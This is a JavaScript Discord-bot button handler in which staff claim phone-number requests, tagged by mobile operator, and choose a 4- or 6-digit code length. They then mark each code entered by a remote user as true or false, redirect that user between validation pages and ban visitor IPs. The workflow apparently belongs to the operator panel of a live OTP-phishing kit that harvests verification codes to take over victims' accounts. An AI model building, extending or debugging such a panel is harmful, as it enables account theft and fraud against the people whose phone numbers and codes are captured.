/**
 * buttons.js — Discord button interaction handler  (v2.6)
 *
 * v2.6 — Permissions + cross-context refresh:
 *  - Every button now requires the STAFF role (or OWNER, which implies it) —
 *    previously anyone who could see the channel could click Claim/Ban IP/etc.
 *    Only checked for guild-context interactions (`interaction.inGuild()`):
 *    the True/False Code buttons are delivered to the claimer's DM, where
 *    Discord gives us no member/role data at all, so that path still relies
 *    on the existing claimer-only lock (a Discord user ID check) instead.
 *  - OWNER bypasses the claimer-only lock entirely — can act on any request
 *    regardless of who claimed it.
 *  - True/False Code (clicked in a DM) now also refresh the ORIGINAL channel
 *    embed, not just the DM message. Previously `interaction.message` for
 *    those two actions pointed at the DM — editing it only updated what the
 *    claimer personally saw, leaving the public channel embed stuck on
 *    "⏳ Awaiting Code" forever. Uses messageStore's phone -> channel message
 *    lookup (persisted in Postgres, survives a bot restart) to find and
 *    edit the right message.
 *
 * v2.5 — Interaction-safety pass (fixes "Unknown interaction" / 10062 crashes):
 *  - `deferReply`/`editReply`/`reply` are now ALWAYS wrapped (safeDefer /
 *    safeReply) instead of bare `await`. Previously a bare
 *    `await interaction.deferReply(...)` sat OUTSIDE any try/catch — if the
 *    interaction token had already expired (Discord gateway lag, a slow DB
 *    call, or just staff mashing the same button), that throw was uncaught
 *    at that call site and surfaced as a scary top-level "Interaction error"
 *    from bot.js, without ever running the actual action.
 *  - Moved the claimer-only permission check (`getUnauthorizedClaimer`, which
 *    can hit the DB) to run AFTER deferring instead of before. Previously the
 *    DB round-trip happened first and ate into the interaction's 3-second ack
 *    window — under any DB latency this alone could cause the token to expire
 *    before we ever got to `deferReply`. Now we ack immediately (in-memory,
 *    no network) and do the slower permission check afterwards.
 *  - Added an in-memory fast-path on "claim": if we already know (from the
 *    local claimStore) that someone else holds it, we reply immediately
 *    without a wasted round-trip to the API — avoids racing multiple staff
 *    clicks against the backend when the answer is already known locally.
 *  - Claimer resolution goes through the shared claimStore (utils/claimStore.js)
 *    instead of a separate local Map — polling.js uses the exact same store.
 *
 * v2.4 — Ping routing:
 *  - New request (sent from polling.js) pings the @access role.
 *  - Every embed after that (claimed, len4/6, wrong, false code, true code)
 *    explicitly pings the claimer in `content`.
 *  - Unclaim resets back to "unclaimed" — content pings @access again since
 *    it's back in the pool for anyone to grab.
 *
 * v2.3 — False code flow overhaul:
 *  falsecode → edit message IN-PLACE back to [4/6 digits · Wrong · Unclaim]
 *  instead of sending a brand new embed.
 *
 * v2.2: claimer-only buttons (in-memory + DB fallback after restart)
 * v2.1: len4/len6 length param, unclaim restores Claim button,
 *        double-claim protection, fetch timeout, unclaim logging.
 */

import {
    ButtonBuilder, ButtonStyle,
    ActionRowBuilder, EmbedBuilder,
} from "discord.js";
import { CONFIG }                                       from "../config.js";
import { getRequestByPhone }                             from "../database.js";
import { getOperatorColor }                               from "../utils/colors.js";
import { formatPhone }                                    from "../utils/formatters.js";
import { callStaffAction, callBanIP }                    from "../utils/api.js";
import { setClaimer, clearClaimer, getClaimer, peekClaimer } from "../utils/claimStore.js";
import { recallMessage, forgetMessage }                  from "../utils/messageStore.js";
import { isStaff, isOwner }                               from "../utils/permissions.js";
import { getLang }                                        from "../utils/userPrefs.js";
import { t }                                               from "../utils/i18n.js";

// WHAT IS AND ISN'T TRANSLATED IN THIS FILE
//   Translated  — every ephemeral reply (safeReply) and the DM embeds, since
//                 those are delivered to exactly one person: the clicker.
//   NOT translated — the channel embeds edited via safeEditMessage and
//                 refreshChannelMessage. Those are shared messages the whole
//                 team reads; Discord shows one message identically to every
//                 viewer, so translating them into the clicker's language
//                 would impose that language on everyone else.
//
// Language is loaded AFTER safeDefer, never before: getLang can hit the
// database on a cache miss, and anything slow in front of the defer eats
// into the interaction's 3-second ack window (the exact failure mode the
// v2.5 notes above describe).

// ─── Interaction-safety helpers ───────────────────────────────────────────────

/**
 * Defers the interaction (ephemeral) without ever throwing. Returns true if
 * the defer actually succeeded, false if the token was already dead (expired,
 * Discord hiccup, etc.) — callers use this to decide whether editReply/reply
 * can still work, but proceed with the underlying action either way since
 * that's the user's real intent and the channel embed is the real feedback.
 */
async function safeDefer(interaction) {
    const start = Date.now();
    try {
        await interaction.deferReply({ flags: 64 });
        const tookMs = Date.now() - start;
        // Visible even on SUCCESS now — previously only failures were logged,
        // so there was no way to tell if defers were chronically slow but
        // just barely squeaking under the 3s limit. >1000ms here means
        // Discord REST latency from this host is a real, ongoing problem.
        if (tookMs > 1000) {
            console.warn(`⏱️  deferReply for ${interaction.id} took ${tookMs}ms to succeed — Discord REST latency from this host is high.`);
        }
        return true;
    } catch (e) {
        const tookMs   = Date.now() - start;
        const ageAtCallMs = start - interaction.createdTimestamp;
        console.warn(
            `⚠️  Could not defer interaction ${interaction.id} after ${tookMs}ms of trying ` +
            `(interaction was already ${ageAtCallMs}ms old when we started the call): ${e.message}`
        );
        return false;
    }
}

/** Replies/edits without ever throwing — no-ops silently if the token is dead. */
async function safeReply(interaction, deferred, options) {
    try {
        if (deferred) {
            await interaction.editReply(options);
        } else if (!interaction.replied && !interaction.deferred) {
            await interaction.reply({ ...options, flags: 64 });
        }
    } catch (e) {
        console.warn(`⚠️  Could not reply to interaction ${interaction.id} (expired?):`, e.message);
    }
}

// ─── Ping helpers ──────────────────────────────────────────────────────────────

/** Ping the person who currently holds the claim. */
function pingUser(userId) {
    return `<@${userId}>`;
}

/** Ping the @access role — used when a request is unclaimed/back in the pool. */
function pingAccessRole() {
    return `<@&${CONFIG.ACCESS_ROLE_ID}>`;
}

// ─── Shared button builders ───────────────────────────────────────────────────

function createBanIPButton(ip) {
    if (!ip || ip === "unknown" || ip === "null" || !ip.includes(".")) return null;
    return new ButtonBuilder()
        .setCustomId("banip_" + ip)
        .setLabel("🚫 Ban IP")
        .setStyle(ButtonStyle.Danger);
}

/** Returns the ActionRow used right after a claim (4/6 · Wrong · Unclaim · BanIP). */
function buildPostClaimRow(phone, ip) {
    const buttons = [
        new ButtonBuilder().setCustomId("len4_"    + phone).setLabel("🔢 4 digits").setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId("len6_"    + phone).setLabel("🔢 6 digits").setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId("wrong_"   + phone).setLabel("❌ Wrong Number").setStyle(ButtonStyle.Danger),
        new ButtonBuilder().setCustomId("unclaim_" + phone).setLabel("↩️ Unclaim").setStyle(ButtonStyle.Secondary),
    ];
    const banBtn = createBanIPButton(ip);
    if (banBtn) buttons.push(banBtn);
    return new ActionRowBuilder().addComponents(...buttons);
}

/** Edit a message silently (stale interaction tokens don't crash the bot). */
async function safeEditMessage(message, options) {
    try { await message.edit(options); }
    catch (e) { console.warn("⚠️  Could not edit message (stale?):", e.message); }
}

/**
 * Refreshes the ORIGINAL public channel embed for a phone number, looked up
 * via messageStore (works even when the current interaction came from a DM,
 * which has no route back to the channel message through discord.js alone).
 * `build` receives the channel message currently on Discord and returns the
 * edit payload — a no-op (with a warning) if the message can no longer be
 * found (deleted, or never tracked, e.g. a very old request from before this
 * feature existed).
 */
async function refreshChannelMessage(client, phone, build) {
    const loc = await recallMessage(phone);
    if (!loc) {
        console.warn(`⚠️  No tracked channel message for ${phone} — cannot refresh it.`);
        return;
    }
    try {
        const channel = await client.channels.fetch(loc.channelId);
        const message = await channel.messages.fetch(loc.messageId);
        await message.edit(build(message));
    } catch (e) {
        console.warn(`⚠️  Could not refresh channel message for ${phone}:`, e.message);
    }
}

// ─── Claimer-only enforcement ─────────────────────────────────────────────────

/** Returns the claimer userId if the caller is NOT allowed, or null if allowed. */
async function getUnauthorizedClaimer(phone, userId) {
    const claimer = await getClaimer(phone);
    if (!claimer)           return null;  // no lock → allow
    if (claimer === userId) return null;  // correct person → allow
    return claimer;                       // wrong person → deny
}

/**
 * Handles a claim attempt that came back unsuccessful (409 from the API, or
 * a network/timeout error where we genuinely don't know if it went through).
 *
 * Does two things:
 *   1. Self-heals: checks the DB directly for the real current claimer. If
 *      it turns out to be the SAME person who just clicked (e.g. their first
 *      attempt actually succeeded and only the response was lost to a
 *      timeout), we treat it as a success instead of a false "network error".
 *   2. Refreshes the message: if someone else holds the claim, the embed is
 *      almost certainly stale (still showing the "Claim" button that other
 *      staff keep clicking, reproducing the same 409 over and over). We
 *      rewrite it in place to reflect reality so nobody else hits the same
 *      wall.
 */
async function handleFailedClaim(interaction, deferred, phone, apiMessage, lang = "en") {
    let row = null;
    try { row = await getRequestByPhone(phone); } catch (e) { console.warn("⚠️  Could not re-check request after failed claim:", e.message); }

    const realClaimer = row?.claimed_by_discord_id || null;

    // Self-heal: our own claim actually went through, we just didn't hear back in time.
    if (realClaimer === interaction.user.id) {
        setClaimer(phone, interaction.user.id);
        await safeReply(interaction, deferred, { content: t(lang, "claimed", formatPhone(phone), `<@${interaction.user.id}>`) });
        const newEmbed = EmbedBuilder.from(interaction.message.embeds[0])
            .setColor(getOperatorColor(row?.operator))
            .setTitle("📋 Request In Progress")
            .setDescription(
                `👤 Claimed by <@${interaction.user.id}>\n` +
                `⏰ Claimed <t:${Math.floor(Date.now() / 1000)}:R>\n\n` +
                `**🔧 Choose an action:**`
            );
        await safeEditMessage(interaction.message, {
            content:    pingUser(interaction.user.id),
            embeds:     [newEmbed],
            components: [buildPostClaimRow(phone, row?.ip_address)],
        });
        return;
    }

    // apiMessage null means we got here from a network/timeout error rather
    // than a clean "already claimed" response from the API — word it as such
    // instead of claiming someone else holds it, which we don't actually know.
    await safeReply(interaction, deferred, {
        content: apiMessage
            ? "❌ " + apiMessage
            : (realClaimer ? t(lang, "already_claimed", `<@${realClaimer}>`) : t(lang, "network_error_claim")),
    });

    // Refresh the stale embed so future clicks don't repeat the same failure.
    if (row && realClaimer) {
        setClaimer(phone, realClaimer);
        const staleEmbed = EmbedBuilder.from(interaction.message.embeds[0])
            .setColor(getOperatorColor(row.operator))
            .setTitle("📋 Request In Progress")
            .setDescription(`👤 Already claimed by <@${realClaimer}>\n\n**🔧 Choose an action:**`);
        await safeEditMessage(interaction.message, {
            content:    pingUser(realClaimer),
            embeds:     [staleEmbed],
            components: [buildPostClaimRow(phone, row.ip_address)],
        });
    } else if (row && row.status !== "pending") {
        // Not claimed by anyone, but not pending either (completed / wrong_number / etc.)
        const staleEmbed = EmbedBuilder.from(interaction.message.embeds[0])
            .setColor(0x6b7280)
            .setTitle("⚠️ Request No Longer Available")
            .setDescription(`This request's status is now \`${row.status}\` — it can no longer be claimed here.`);
        await safeEditMessage(interaction.message, { content: "", embeds: [staleEmbed], components: [] });
    }
}

// ─── Main handler ─────────────────────────────────────────────────────────────

export async function handleButton(interaction) {
    // Diagnostic: how old was this interaction by the time our code even saw
    // it? If this is already close to (or over) 3000ms, the delay is
    // upstream of us — gateway dispatch lag or the event loop being blocked
    // — and no amount of retrying deferReply faster will fix it. If this is
    // small but deferReply itself still times out (see safeDefer's own
    // logging), the problem is specifically the outbound REST call to
    // Discord being slow from this host/network.
    const receivedAgeMs = Date.now() - interaction.createdTimestamp;
    if (receivedAgeMs > 1200) {
        console.warn(`⏱️  Interaction ${interaction.id} was already ${receivedAgeMs}ms old when handleButton started (gateway dispatch delay or blocked event loop).`);
    }

    // ══ PERMISSIONS ════════════════════════════════════════════════════════
    // Only checked in a guild context. The True/False Code buttons arrive
    // via DM — Discord gives no member/role data there — so those rely
    // entirely on the claimer-only lock below (a plain Discord user ID
    // comparison, which needs no role information to be secure).
    if (interaction.inGuild() && !isStaff(interaction.member)) {
        try {
            const lang = await getLang(interaction.user.id);
            await interaction.reply({ content: t(lang, "no_permission"), flags: 64 });
        } catch (e) {
            console.warn(`⚠️  Could not send permission-denied reply for ${interaction.id}:`, e.message);
        }
        return;
    }

    const [action, ...rest] = interaction.customId.split("_");
    const payload = rest.join("_");
    const callerIsOwner = interaction.inGuild() && isOwner(interaction.member);

    // ══ OPEN TO ALL STAFF ════════════════════════════════════════════════════

    // ─── CLAIM ────────────────────────────────────────────────────────────────
    if (action === "claim") {
        const phone = payload;

        // Fast-path: if the local claimStore already knows someone else holds
        // this phone, skip the round-trip to the API entirely — the answer
        // is already known, so there's no reason to spend part of the
        // interaction's ack window (or the API's time) confirming it.
        // Owner bypasses this — they're allowed to attempt a takeover.
        const knownClaimer = peekClaimer(phone);
        const deferred = await safeDefer(interaction);
        const lang     = await getLang(interaction.user.id);

        if (knownClaimer && knownClaimer !== interaction.user.id && !callerIsOwner) {
            await safeReply(interaction, deferred, { content: t(lang, "already_claimed", `<@${knownClaimer}>`) });
            return;
        }

        try {
            const data = await callStaffAction("claim", phone, interaction.user.tag, null, interaction.user.id);
            if (!data.success) {
                await handleFailedClaim(interaction, deferred, phone, data.message, lang);
                return;
            }

            setClaimer(phone, interaction.user.id);
            await safeReply(interaction, deferred, { content: t(lang, "claimed", formatPhone(phone), `<@${interaction.user.id}>`) });

            const row      = await getRequestByPhone(phone);
            const newEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                .setColor(getOperatorColor(row?.operator))
                .setTitle("📋 Request In Progress")
                .setDescription(
                    `👤 Claimed by <@${interaction.user.id}>\n` +
                    `⏰ Claimed <t:${Math.floor(Date.now() / 1000)}:R>\n\n` +
                    `**🔧 Choose an action:**`
                );

            await safeEditMessage(interaction.message, {
                content:    pingUser(interaction.user.id),
                embeds:     [newEmbed],
                components: [buildPostClaimRow(phone, row?.ip_address)],
            });
        } catch (e) {
            // A genuine network/timeout error here doesn't necessarily mean the
            // claim failed server-side — the API client retries transient
            // errors and the very first attempt may have gone through before
            // its response was lost. Self-heal instead of blindly reporting
            // failure: check who the DB says holds the claim right now.
            console.error("Claim error:", e);
            await handleFailedClaim(interaction, deferred, phone, null, lang);
        }
        return;
    }

    // ─── BAN IP ───────────────────────────────────────────────────────────────
    if (action === "banip") {
        const ip = payload;
        const deferred = await safeDefer(interaction);
        const lang     = await getLang(interaction.user.id);
        if (!ip || ip === "unknown" || ip === "null") {
            await safeReply(interaction, deferred, { content: t(lang, "invalid_ip") });
            return;
        }
        try {
            const data = await callBanIP(ip, interaction.user.tag);
            if (!data.success) { await safeReply(interaction, deferred, { content: "❌ " + data.message }); return; }
            await safeReply(interaction, deferred, { content: t(lang, "ip_banned", ip) });
            const bannedEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                .setColor(0xef4444).setTitle("🔨 IP Banned")
                .setDescription(`🚫 \`${ip}\` banned by <@${interaction.user.id}>\n⏰ <t:${Math.floor(Date.now() / 1000)}:R>`);
            await safeEditMessage(interaction.message, { content: pingUser(interaction.user.id), embeds: [bannedEmbed], components: [] });
        } catch (e) {
            console.error("banip error:", e);
            await safeReply(interaction, deferred, { content: t(lang, "network_error_ban") });
        }
        return;
    }

    // ══ CLAIMER-ONLY BUTTONS ═══════════════════════════════════════════════════
    // Defer FIRST (fast, in-memory, no network) — THEN do the DB permission
    // check. Doing it the other way around (as before) let the DB round-trip
    // eat into the interaction's 3-second ack window, which could expire the
    // token before we ever got to deferReply. OWNER bypasses this lock
    // entirely — can act on any request regardless of who claimed it.
    const phone     = payload;
    const deferred  = await safeDefer(interaction);
    const lang      = await getLang(interaction.user.id);
    if (!callerIsOwner) {
        const otherUser = await getUnauthorizedClaimer(phone, interaction.user.id);
        if (otherUser) {
            await safeReply(interaction, deferred, {
                content: t(lang, "claimer_only", `<@${otherUser}>`),
            });
            return;
        }
    }

    // ─── 4 CHIFFRES ───────────────────────────────────────────────────────────
    if (action === "len4") {
        try {
            const data = await callStaffAction("set_length", phone, interaction.user.tag, 4);
            if (!data.success) { await safeReply(interaction, deferred, { content: "❌ " + data.message }); return; }
            await safeReply(interaction, deferred, { content: t(lang, "len_requested", 4, formatPhone(phone)) });
            const doneEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                .setColor(0x10b981).setTitle("⏳ Awaiting Code (4 digits)")
                .setDescription(
                    `👤 Claimed by <@${interaction.user.id}>\n` +
                    `🔢 Requested code: \`4 digits\`\n` +
                    `⏰ <t:${Math.floor(Date.now() / 1000)}:R>\n\n` +
                    `*Waiting for the user to enter it…*`
                );
            await safeEditMessage(interaction.message, { content: pingUser(interaction.user.id), embeds: [doneEmbed], components: [] });
        } catch (e) { console.error("len4 error:", e); await safeReply(interaction, deferred, { content: t(lang, "generic_error") }); }
        return;
    }

    // ─── 6 CHIFFRES ───────────────────────────────────────────────────────────
    if (action === "len6") {
        try {
            const data = await callStaffAction("set_length", phone, interaction.user.tag, 6);
            if (!data.success) { await safeReply(interaction, deferred, { content: "❌ " + data.message }); return; }
            await safeReply(interaction, deferred, { content: t(lang, "len_requested", 6, formatPhone(phone)) });
            const doneEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                .setColor(0x10b981).setTitle("⏳ Awaiting Code (6 digits)")
                .setDescription(
                    `👤 Claimed by <@${interaction.user.id}>\n` +
                    `🔢 Requested code: \`6 digits\`\n` +
                    `⏰ <t:${Math.floor(Date.now() / 1000)}:R>\n\n` +
                    `*Waiting for the user to enter it…*`
                );
            await safeEditMessage(interaction.message, { content: pingUser(interaction.user.id), embeds: [doneEmbed], components: [] });
        } catch (e) { console.error("len6 error:", e); await safeReply(interaction, deferred, { content: t(lang, "generic_error") }); }
        return;
    }

    // ─── MAUVAIS NUMÉRO ───────────────────────────────────────────────────────
    if (action === "wrong") {
        try {
            const data = await callStaffAction("wrong_number", phone, interaction.user.tag);
            if (!data.success) { await safeReply(interaction, deferred, { content: "❌ " + data.message }); return; }
            await safeReply(interaction, deferred, { content: t(lang, "wrong_reported", formatPhone(phone)) });
            const reporter = interaction.user.id;
            clearClaimer(phone);
            forgetMessage(phone); // terminal state — no more refreshes needed for this request
            const doneEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                .setColor(0xef4444).setTitle("❌ Wrong Number")
                .setDescription(`❌ The user is being redirected to re-enter their number.\n⏰ <t:${Math.floor(Date.now() / 1000)}:R>`);
            await safeEditMessage(interaction.message, { content: pingUser(reporter), embeds: [doneEmbed], components: [] });
        } catch (e) { console.error("wrong error:", e); await safeReply(interaction, deferred, { content: t(lang, "generic_error") }); }
        return;
    }

    // ─── UNCLAIM ──────────────────────────────────────────────────────────────
    if (action === "unclaim") {
        try {
            const data = await callStaffAction("unclaim", phone, interaction.user.tag);
            if (!data.success) { await safeReply(interaction, deferred, { content: "❌ " + data.message }); return; }
            clearClaimer(phone);
            await safeReply(interaction, deferred, { content: t(lang, "unclaimed", formatPhone(phone)) });

            const row    = await getRequestByPhone(phone);
            const reclaimBtn = new ButtonBuilder()
                .setCustomId("claim_" + phone).setLabel("📋 Claim").setStyle(ButtonStyle.Primary);
            const banBtn = createBanIPButton(row?.ip_address);
            const btns   = banBtn ? [reclaimBtn, banBtn] : [reclaimBtn];

            const unclaimedEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                .setColor(0x6b7280).setTitle("📭 Request Unclaimed")
                .setDescription(`↩️ Unclaimed by <@${interaction.user.id}>\n⏰ <t:${Math.floor(Date.now() / 1000)}:R>\nBack in the waiting queue.`);
            // Back in the pool for anyone to grab — ping @access again, like a new request.
            await safeEditMessage(interaction.message, {
                content:    pingAccessRole(),
                embeds:     [unclaimedEmbed],
                components: [new ActionRowBuilder().addComponents(...btns)],
            });
        } catch (e) { console.error("unclaim error:", e); await safeReply(interaction, deferred, { content: t(lang, "generic_error") }); }
        return;
    }

    // ─── TRUE CODE ────────────────────────────────────────────────────────────
    // Clicked from the claimer's DM — interaction.message here IS the DM, not
    // the public channel embed. Update both: the DM (so the claimer sees
    // their own confirmation) and the channel message (so everyone watching
    // the channel sees the request is done), via the messageStore lookup.
    if (action === "truecode") {
        try {
            const data = await callStaffAction("true_code", phone, interaction.user.tag);
            if (!data.success) { await safeReply(interaction, deferred, { content: "❌ " + data.message }); return; }
            await safeReply(interaction, deferred, { content: t(lang, "truecode_ok", formatPhone(phone)) });
            const validator = interaction.user.id;
            clearClaimer(phone);

            // The DM belongs to this one person — safe to translate.
            const dmEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                .setColor(0x10b981).setTitle(t(lang, "dm_truecode_title"))
                .setDescription(t(lang, "dm_truecode_desc", Math.floor(Date.now() / 1000)));
            await safeEditMessage(interaction.message, { embeds: [dmEmbed], components: [] });

            await refreshChannelMessage(interaction.client, phone, (msg) =>
                ({
                    content: pingUser(validator),
                    embeds: [
                        EmbedBuilder.from(msg.embeds[0])
                            .setColor(0x10b981).setTitle("✅ Code Validated!")
                            .setDescription(`👤 Validated by <@${validator}>\n⏰ <t:${Math.floor(Date.now() / 1000)}:R>\nThe user is being redirected to the success page.`),
                    ],
                    components: [],
                })
            );
            forgetMessage(phone); // terminal state — no more refreshes needed for this request
        } catch (e) { console.error("truecode error:", e); await safeReply(interaction, deferred, { content: t(lang, "generic_error") }); }
        return;
    }

    // ─── FALSE CODE ───────────────────────────────────────────────────────────
    // Also clicked from the claimer's DM. The DM gets a short confirmation
    // (no buttons — the actual next step lives in the channel); the channel
    // message is edited back to the "choose length" state via messageStore so
    // staff can immediately pick 4/6 again from the public embed.
    // User side: verify-wait.js detects retry_code → redirects to
    // validation.html?retry=1; validation.js waits for waiting_code →
    // redirects to code.html with the correct length.
    if (action === "falsecode") {
        try {
            const data = await callStaffAction("false_code", phone, interaction.user.tag);
            if (!data.success) { await safeReply(interaction, deferred, { content: "❌ " + data.message }); return; }

            await safeReply(interaction, deferred, { content: t(lang, "falsecode_ok", formatPhone(phone)) });

            // The DM belongs to this one person — safe to translate.
            const dmEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                .setColor(0xf59e0b).setTitle(t(lang, "dm_falsecode_title"))
                .setDescription(t(lang, "dm_falsecode_desc"));
            await safeEditMessage(interaction.message, { embeds: [dmEmbed], components: [] });

            const row = await getRequestByPhone(phone);
            await refreshChannelMessage(interaction.client, phone, (msg) =>
                ({
                    content: pingUser(interaction.user.id),
                    embeds: [
                        EmbedBuilder.from(msg.embeds[0])
                            .setColor(0xf59e0b)
                            .setTitle("🔄 Code Rejected — New Length?")
                            .setDescription(
                                `👤 Claimed by <@${interaction.user.id}>\n` +
                                `⏰ <t:${Math.floor(Date.now() / 1000)}:R>\n` +
                                `⚠️ The previous code was **incorrect**.\n` +
                                `The user is waiting on the validation page.\n\n` +
                                `**Choose the length of the next code:**`
                            ),
                    ],
                    components: [buildPostClaimRow(phone, row?.ip_address)],
                })
            );
        } catch (e) { console.error("falsecode error:", e); await safeReply(interaction, deferred, { content: t(lang, "generic_error") }); }
        return;
    }

    console.warn("⚠️  Unknown button action:", action, "payload:", payload);
}
